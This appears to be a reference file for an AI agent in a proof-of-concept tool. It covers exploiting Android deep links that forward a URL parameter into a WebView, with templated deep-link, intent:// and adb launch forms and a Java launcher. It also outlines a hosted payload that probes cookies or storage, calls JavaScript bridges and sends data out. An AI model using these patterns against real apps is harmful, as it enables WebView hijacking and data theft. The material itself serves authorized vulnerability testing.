---
name: poc-app-webview
description: WebView PoC reference for deep-link to WebView sink URL-parameter injection.
---

# WebView PoC Reference

Use this reference for the common case where:

- an exported `VIEW` / `BROWSABLE` activity accepts a deep link
- one query parameter is forwarded into `WebView.loadUrl(...)`
- the attacker only needs to control the target URL

This is the main server-side pattern for `decx-poc`. Keep it simple:

- add one hyperlink in `server/public/index.html`
- add one script block in `server/public/payload.html`

## Construction Goal

Build these three forms for the same target:

1. the raw deep link
2. the browser-friendly `intent://` URL
3. the equivalent `adb shell am start` command

## Deep Link Pattern

Typical shape:

```text
TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html
```

Where:

- `TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=` is the victim deep-link prefix
- `payload.html` is the attacker-controlled page served by the local PoC server

## intent:// Pattern

Browser-oriented shape:

```text
intent://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html#Intent;scheme=TARGET_SCHEME;package=TARGET_PACKAGE;component=TARGET_PACKAGE/.DeepLinkActivity;end
```

Use this when:

- the tester wants one clickable browser link
- the explicit victim package or activity is known

## ADB Pattern

Implicit launch:

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html"
```

Explicit launch:

```bash
adb shell am start -n TARGET_PACKAGE/.DeepLinkActivity \
  -a android.intent.action.VIEW \
  -d "TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html"
```

## Android-Side Launch Body

Keep the app-side PoC helper thin. It only needs to prove the deep link or URL handoff:

```java
private static void runWebViewDeepLink(Context context) {
    Intent intent = new Intent(Intent.ACTION_VIEW);
    intent.setData(Uri.parse("TARGET_SCHEME://TARGET_HOST/TARGET_PATH?url=http%3A%2F%2F127.0.0.1%3A8000%2Fpayload.html"));
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent);
    Log.i("PoC", "Launched deep link into victim WebView sink");
}
```

## Hosted Payload Rule

`payload.html` should stay minimal.

Normal payload changes:

- one bridge call
- one cookie or storage probe
- one `intent://` redirect
- one exfiltration request

Do not turn the template into a framework. Add one script block per active PoC and remove anything the target does not need.
